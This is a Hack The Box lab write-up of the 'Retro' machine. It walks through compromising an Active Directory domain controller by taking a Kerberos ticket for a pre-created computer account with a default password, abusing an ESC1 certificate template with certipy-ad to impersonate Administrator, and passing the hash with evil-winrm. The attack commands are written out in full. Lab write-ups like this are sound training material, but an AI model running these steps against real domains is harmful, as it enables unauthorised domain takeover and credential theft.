Hack the box - Retro

July 1, 2025 · 14 min read
Bilash J. Shahi
Cybersecurity enthusiast

Here’s my writeup for the Hack the Box machine, "Retro." This was a fun and classic Active Directory box that involved a bit of enumeration, hunting for clues, and ultimately abusing a misconfigured certificate template (AD CS) to escalate from a low-privileged computer account all the way to Domain Admin.

Reconnaissance: Kicking the Tires​

As always, I kicked things off by running an nmap scan to see what ports were open.

The output immediately screamed "Windows Domain Controller." All the usual suspects were there: DNS (53), Kerberos (88), LDAP (389), SMB (445), and WinRM (5985). The nmap script output confirmed the domain was retro.vl.

Before diving in, I did some prep work on my attacker machine to make interacting with the domain easier.

  1. Updated /etc/hosts: To make sure Kerberos and other tools could resolve the domain name.

    ┌──(elodvk㉿kali)-[~/hack-the-box/retro]
    └─$ echo '10.129.234.44    dc dc.retro.vl retro.vl' | sudo tee /etc/hosts
    sudo: unable to resolve host kali: Name or service not known
    [sudo] password for elodvk: 
    10.129.234.44    dc dc.retro.vl retro.vl

  2. Configured /etc/krb5.conf: To tell my system about the RETRO.VL realm.

    [libdefaults]
        default_realm = RETRO.VL
        dns_lookup_realm = false
        dns_lookup_kdc = true

    [realms]
        RETRO.VL = {
            kdc = dc.retro.vl
            admin_server = dc.retro.vl
        }

    [domain_realm]
        .retro.vl = RETRO.VL
        retro.vl = RETRO.VL

  3. Synced Time: Kerberos is picky about time, so I synced my clock with the DC.

    ┌──(elodvk㉿kali)-[~/hack-the-box/retro]
    └─$ sudo ntpdate dc             
    sudo: unable to resolve host kali: Name or service not known
    2025-07-01 12:35:03.104012 (+0530) -19.185574 +/- 0.150646 dc 10.129.234.44 s1 no-leap
    CLOCK: time stepped by -19.185574

Privilege Escalation: Banking on AD CS​

The note mentioned a "pre created computer account." My RID cycling output had already shown another interesting account: BANKING$. Computer accounts end with a $, so this was my target. For pre-created computer accounts, the default password is often the account name in lowercase (without the $).

I tried to get a Kerberos ticket for BANKING$ with the password banking, and it was a success!

┌──(elodvk㉿kali)-[~/hack-the-box/retro]
└─$ impacket-getTGT 'retro.vl/banking$:banking'
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in banking$.ccache

┌──(elodvk㉿kali)-[~/hack-the-box/retro]
└─$ export KRB5CCNAME=banking\$.ccache

Now, with credentials for a computer account, I had more privileges within the domain. I used certipy-ad to see if there were any misconfigurations in Active Directory Certificate Services (AD CS).

certipy-ad found a vulnerable template called "RetroClients" that was susceptible to ESC1.

The ESC1 vulnerability is awesome. It means that because the BANKING$ account can enroll in this template, and the template allows the user to specify a name (a Subject Alternative Name, or SAN), I could request a certificate as any user, including the domain administrator!

My first attempt to request a certificate as administrator@retro.vl failed.

┌──(elodvk㉿kali)-[~/hack-the-box/retro]
└─$ certipy-ad req -ca retro-DC-CA -template RetroClients -dc-host dc.retro.vl -k -u 'banking$@retro.vl' -no-pass -target dc.retro.vl -upn 'administrator@retro.vl'
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[!] DNS resolution failed: The DNS query name does not exist: dc.retro.vl.
[!] Use -debug to print a stacktrace
[*] Requesting certificate via RPC
[*] Request ID is 15
[-] Got error while requesting certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template.
Would you like to save the private key? (y/N):

Right. Looking back at the Certipy output, the template required a Minimum RSA Key Length of 4096.

Easy fix. I tried again with the -key-size 4096 flag.

This time, I got a certificate (administrator.pfx), but when I tried to authenticate with it, I got another error: Object SID mismatch. This meant the certificate was missing the Administrator's unique Security ID (SID).

For the third and final attempt, I specified the Administrator's SID (which ends in -500 for the built-in admin) in the request.

└─$ certipy-ad req -ca retro-DC-CA -template RetroClients -k -u 'banking$@retro.vl' -no-pass -target dc.retro.vl -upn 'administrator@retro.vl' -key-size 4096 -sid  S-1-5-21-2983547755-698260136-4283918172-500

Rooted: Pass-the-Hash for the Win​

With the Administrator's NTLM hash, it was game over. I used evil-winrm to Pass-the-Hash and get a shell on the domain controller as the highest privileged user.

┌──(elodvk㉿kali)-[~/hack-the-box/retro]
└─$ evil-winrm -i 10.129.234.44 -u administrator -H 252fac7066d93dd009d4fd2cd0368389
